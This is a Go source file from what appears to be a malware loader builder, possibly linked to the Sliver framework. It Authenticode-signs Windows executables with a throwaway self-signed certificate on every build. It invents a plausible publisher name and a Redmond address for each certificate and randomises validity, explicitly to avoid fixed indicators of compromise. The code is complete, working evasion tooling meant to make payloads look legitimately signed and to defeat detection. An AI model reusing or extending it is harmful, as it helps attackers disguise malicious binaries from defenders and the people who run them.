package loader

import (
	"context"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

func lookOsslSignCode() (string, error) {
	if p, err := exec.LookPath("osslsigncode"); err == nil {
		return p, nil
	}
	// Common user-local install when apt/sudo is unavailable.
	for _, p := range []string{
		filepath.Join(os.Getenv("HOME"), ".local/bin/osslsigncode"),
		"/usr/local/bin/osslsigncode",
		"/usr/bin/osslsigncode",
	} {
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p, nil
		}
	}
	return "", fmt.Errorf("osslsigncode not installed")
}

func lookOpenSSL() (string, error) {
	if p, err := exec.LookPath("openssl"); err == nil {
		return p, nil
	}
	return "", fmt.Errorf("openssl not found")
}

// blandPublisherCN picks a per-build subject CN (not a fixed IOC string).
func blandPublisherCN(seed []byte) string {
	first := []string{
		"Northwind", "Contoso", "Fabrikam", "Tailspin", "Adventure", "Blue Yonder",
		"Litware", "Proseware", "Wingtip", "Wide World", "Humongous", "Alpine",
	}
	second := []string{
		"Systems", "Software", "Technologies", "Solutions", "Digital", "Labs",
		"Computing", "Networks", "Services", "Applications", "Dynamics", "Soft",
	}
	suf := []string{"LLC", "Ltd", "Inc", "Corp", "GmbH", "Co"}
	if len(seed) < 3 {
		seed = randBytes(3)
	}
	return first[int(seed[0])%len(first)] + " " +
		second[int(seed[1])%len(second)] + " " +
		suf[int(seed[2])%len(suf)]
}

func sanitizeCN(cn string) string {
	return strings.Map(func(r rune) rune {
		switch r {
		case '/', '\\', '\n', '\r', '\x00', '"':
			return '-'
		default:
			return r
		}
	}, cn)
}

// signEphemeralAuthenticode creates a fresh self-signed cert and Authenticode-signs pe.
// Each call yields a new key/cert (random publisher identity).
// If osslsigncode/openssl are missing, returns (pe, "", nil) — unsigned passthrough.
func signEphemeralAuthenticode(pe []byte, opts Options) ([]byte, string, error) {
	if len(pe) < 0x40 {
		return pe, "", nil
	}
	signBin, err := lookOsslSignCode()
	if err != nil {
		return pe, "", nil
	}
	ssl, err := lookOpenSSL()
	if err != nil {
		return pe, "", nil
	}

	dir, err := os.MkdirTemp("", "sliv-sign-*")
	if err != nil {
		return nil, "", err
	}
	defer os.RemoveAll(dir)

	seed := append(append([]byte{}, opts.Nonce...), []byte(opts.BuildID)...)
	cn := sanitizeCN(blandPublisherCN(seed))
	if cn == "" {
		cn = "Build " + hex.EncodeToString(randBytes(4))
	}

	keyPath := filepath.Join(dir, "key.pem")
	certPath := filepath.Join(dir, "cert.pem")
	inPath := filepath.Join(dir, "in.exe")
	outPath := filepath.Join(dir, "out.exe")

	days := 30 + int(binary.LittleEndian.Uint16(randBytes(2)))%300
	subj := fmt.Sprintf("/C=US/ST=WA/L=Redmond/O=%s/OU=Engineering/CN=%s", cn, cn)

	gen := exec.Command(ssl, "req", "-x509", "-newkey", "rsa:2048",
		"-keyout", keyPath, "-out", certPath,
		"-days", fmt.Sprintf("%d", days), "-nodes",
		"-subj", subj)
	if out, err := gen.CombinedOutput(); err != nil {
		return nil, "", fmt.Errorf("openssl cert: %w (%s)", err, strings.TrimSpace(string(out)))
	}
	if err := os.WriteFile(inPath, pe, 0o600); err != nil {
		return nil, "", err
	}

	product := cn
	url := "https://example.invalid/" + hex.EncodeToString(randBytes(4))
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()

	// No public timestamp by default — lab/offline friendly; cert identity is already per-build.
	sign := exec.CommandContext(ctx, signBin, "sign",
		"-certs", certPath,
		"-key", keyPath,
		"-n", product,
		"-i", url,
		"-h", "sha256",
		"-in", inPath,
		"-out", outPath,
	)
	if out, err := sign.CombinedOutput(); err != nil {
		// Older osslsigncode may not accept -h; retry minimal flags.
		sign2 := exec.CommandContext(ctx, signBin, "sign",
			"-certs", certPath,
			"-key", keyPath,
			"-n", product,
			"-i", url,
			"-in", inPath,
			"-out", outPath,
		)
		if out2, err2 := sign2.CombinedOutput(); err2 != nil {
			return nil, "", fmt.Errorf("osslsigncode: %w (%s; retry: %s)", err2,
				strings.TrimSpace(string(out)), strings.TrimSpace(string(out2)))
		}
	}

	signed, err := os.ReadFile(outPath)
	if err != nil {
		return nil, "", err
	}
	if len(signed) == 0 {
		return nil, "", fmt.Errorf("osslsigncode produced empty file")
	}
	return signed, cn, nil
}
